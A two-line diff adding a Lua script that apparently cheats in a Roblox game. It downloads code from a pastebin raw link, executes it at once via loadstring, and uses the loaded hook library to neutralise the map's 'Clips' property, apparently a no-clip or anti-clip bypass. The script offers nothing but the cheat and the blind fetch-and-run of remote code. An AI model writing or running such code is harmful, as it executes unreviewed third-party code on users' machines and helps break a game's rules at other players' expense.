@@ -1,0 +1,2 @@
+local EzHook = loadstring(game:HttpGetAsync("https://pastebin.com/raw/3cCyS6GF"))()
+EzHook:HookIndex("Clips",function()end,workspace.Map)
